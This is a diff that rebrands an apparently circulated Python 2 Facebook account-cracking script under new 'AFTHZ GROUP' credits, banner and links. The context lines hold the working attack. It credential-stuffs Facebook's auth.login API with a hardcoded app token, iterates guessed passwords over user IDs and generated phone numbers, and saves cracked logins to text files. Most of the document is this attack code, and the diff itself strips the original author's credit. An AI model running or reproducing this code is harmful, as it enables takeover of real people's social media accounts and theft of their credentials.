@@ -1,18 +1,18 @@
 #coding=utf-8
 #!/usr/bin/python2
 #coding=utf-8
-#originally written by muhammad hamza
+#originally written by shadow hacker
 try:
 	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
 	from multiprocessing.pool import ThreadPool
 	from requests.exceptions import ConnectionError
 except ImportError:
 	os.system("pip2 install requests")
-	os.system("python2 hop.so")
+	os.system("python2 afthz.so")
 
 agents = [
   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+  "Mozilla/4.0 (compatible; MSIE 7.0: Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
   "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
   "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
@@ -378,22 +378,32 @@ sim = random.randint(2e4, 4e4)
 header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 logo ="""
 
-   ##     ##       ######     ###########
-   ##     ##      ##    ##        ##
-   ##     ##      ##              ##
-   #########       ######         ## 
-   ##     ##            ##        ##
-   ##     ##      ##    ##        ## 
-   ##     ##       ######         ##
+   ##      ______ _______ _    _ ______   _____ _____   ____  _    _ _____  
 
+    /\   |  ____|__   __| |  | |___  /  / ____|  __ \ / __ \| |  | |  __ \ 
+
+   /  \  | |__     | |  | |__| |  / /  | |  __| |__) | |  | | |  | | |__) |
+
+  / /\ \ |  __|    | |  |  __  | / /   | | |_ |  _  /| |  | | |  | |  ___/ 
+
+ / ____ \| |       | |  | |  | |/ /__  | |__| | | \ \| |__| | |__| | |     
+
+/_/    \_\_|       |_|  |_|  |_/_____|  \_____|_|  \_\\____/ \____/|_|     
+
+                                                                           
+AFTHZ GROUP DCCODER SHADOW HACKER KASHMIRI HACKER 
+                                                                           
+            NAME TU SUNA HOGA FATHER OF ALL CODERS              
+                    
+          
  ------------------------------------------
 
-   Author   : H S T (HOP)
-   Github   : https://github.com/Hamzahash
-   Youtube  : HS Officials
+   Author   : Kashmiri hacker
+   Github   : https://github.com/shadow
+   Youtube  : MR.HACKER COMING SOON
    Telegram : HOP Programmers
    This tool is free not for sale
-   \033[1;31mTajdar-e-Khatmai-Nabowat ZindaBad\033[0;97m
+   \033[1;31mi hop you like it\033[0;97m
 
  ----------------------------------------- """
 
@@ -410,7 +420,7 @@ def main():
 	print(" [5] Find number details (2018 database)\n")
 	print(" [6] Generate access token")
 	print("")
-	os.system('xdg-open https://t.me/hop1626')
+	os.system('xdg-open https://t.me/shadow-hackr')
 	log_sel()
 def log_sel():
 	sel = raw_input(" Choose an option: ")
@@ -419,11 +429,11 @@ def log_sel():
 	elif sel =="2":
 		ran()
 	elif sel =="3":
-		os.system("xdg-open xdg-open https://youtu.be/gcdZwOqkZSg")
+		os.system("xdg-open xdg-open https://www.facebook.com/102537698751441")
 	elif sel =="4":
-		os.system('xdg-open https://youtu.be/tncUQGIok8c')
+		os.system('xdg-open https://www.facebook.com/102537698751441')
 	elif sel =="5":
-		os.system('xdg-open https://youtu.be/xN-l-dTj6aY')
+		os.system('xdg-open https://www.facebook.com/102537698751441')
 	elif sel =="6":
 		gen_token()
 	else:
@@ -453,11 +463,11 @@ def log_select():
 	elif sel =="2":
 		token()
 	elif sel =="3":
-		os.system("xdg-open xdg-open https://youtu.be/gcdZwOqkZSg")
+		os.system("xdg-open xdg-open https://www.facebook.com/102537698751441")
 	elif sel =="4":
-		os.system('xdg-open https://youtu.be/tncUQGIok8c')
+		os.system('xdg-open https://www.facebook.com/102537698751441')
 	elif sel =="5":
-		os.system('xdg-open https://youtu.be/xN-l-dTj6aY')
+		os.system('xdg-open https://www.facebook.com/102537698751441')
 	elif sel =="6":
 		ran()
 	else:
@@ -549,11 +559,11 @@ def menu_option():
 	elif select =="2":
 		choice()
 	elif select =="3":
-		os.system('xdg-open https://youtu.be/gcdZwOqkZSg')
+		os.system('xdg-open https://www.facebook.com/102537698751441')
 	elif select =='4':
-	    os.system('xdg-open https://youtu.be/tncUQGIok8c')
+	    os.system('xdg-open https://www.facebook.com/102537698751441')
 	elif select =='5':
-	    os.system('xdg-open https://youtu.be/xN-l-dTj6aY')
+	    os.system('xdg-open https://www.facebook.com/102537698751441')
 	else:
 		print("")
 		print("\tSelect valid option")
@@ -665,15 +675,15 @@ def crack_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m [HST-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("hstok.txt", "a")
+				print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass1+"\033[0;97m")
+				ok = open("afthzok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [HST_CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("hstcp.txt", "a")
+					print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("afthzcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -682,15 +692,15 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [HST-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("hstok.txt", "a")
+						print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass2+"\033[0;97m")
+						ok = open("afthzok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [HST_CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("hstcp.txt", "a")
+							print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("afthzcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -699,15 +709,15 @@ def crack_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m [HST-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("hstok.txt", "a")
+								print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass3+"\033[0;97m")
+								ok = open("afthzok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [HST_CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("hstcp.txt", "a")
+									print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("afthzcp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -716,15 +726,15 @@ def crack_select():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q:
-										print(" \033[1;32m [HST-OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("hstok.txt", "a")
+										print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass4+"\033[0;97m")
+										ok = open("afthzok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [HST_CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("hstcp.txt", "a")
+											print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass4+"\033[0;97m")
+											cp = open("afthzcp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
@@ -733,15 +743,15 @@ def crack_select():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q:
-												print(" \033[1;32m [HST-OK] "+uid+" | "+pass5+"\033[0;97m")
-												ok = open("hstok.txt", "a")
+												print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass5+"\033[0;97m")
+												ok = open("afthzok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [HST_CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("hstcp.txt", "a")
+													print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass5+"\033[0;97m")
+													cp = open("afthzcp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
@@ -867,15 +877,15 @@ def choice_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m [HST-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("hstok.txt", "a")
+				print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass1+"\033[0;97m")
+				ok = open("afthzok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [HST_CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("hstcp.txt", "a")
+					print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("afthzcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -883,15 +893,15 @@ def choice_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [HST-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("hstok.txt", "a")
+						print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass2+"\033[0;97m")
+						ok = open("afthzok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [HST_CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("hstcp.txt", "a")
+							print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("afthzcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -899,15 +909,15 @@ def choice_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m [HST-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("hstok.txt", "a")
+								print(" \033[1;32m [AFTHZ-OK] "+uid+" | "+pass3+"\033[0;97m")
+								ok = open("afthzok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [HST_CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("hstcp.txt", "a")
+									print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("afthzcp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -959,15 +969,15 @@ def ran():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m[HST_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
-				ok = open("hstok.txt", "a")
+				print(" \033[1;32m[AFTHZ_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+				ok = open("afthzok.txt", "a")
 				ok.write(k+co+user+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [HST_CP] "+k+co+user+" | "+pass1+"\033[0;97m")
-					cp = open("hstcp.txt", "a")
+					print(" \033[1;33m [AFTHZ_CP] "+k+co+user+" | "+pass1+"\033[0;97m")
+					cp = open("afthzcp.txt", "a")
 					cp.write(k+co+user+"|"+pass1+"\n")
 					cp.close()
 					cps.append(k+co+user+pass1)
@@ -976,15 +986,15 @@ def ran():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m[HST_OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
-						ok = open("hstok.txt", "a")
+						print(" \033[1;32m[AFTHZ_OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
+						ok = open("afthzok.txt", "a")
 						ok.write(k+co+user+"|"+pass2+"\n")
 						ok.close()
 						oks.append(k+co+user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [HST_CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("hstcp.txt", "a")
+							print(" \033[1;33m [AFTHZ_CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("afthzcp.txt", "a")
 							cp.write(k+co+user+"|"+pass2+"\n")
 							cp.close()
 							cps.append(k+co+user+pass2)
@@ -993,15 +1003,15 @@ def ran():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m[HST_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
-								ok = open("hstok.txt", "a")
+								print(" \033[1;32m[AFTHZ_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+								ok = open("afthzok.txt", "a")
 								ok.write(k+co+user+"|"+pass3+"\n")
 								ok.close()
 								oks.append(k+co+user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [HST_CP] "+k+co+user+" | "+pass3+"\033[0;97m")
-									cp = open("hstcp.txt", "a")
+									print(" \033[1;33m [AFTHZ_CP] "+k+co+user+" | "+pass3+"\033[0;97m")
+									cp = open("afthzcp.txt", "a")
 									cp.write(k+co+user+"|"+pass3+"\n")
 									cp.close()
 									cps.append(k+co+user+pass3)
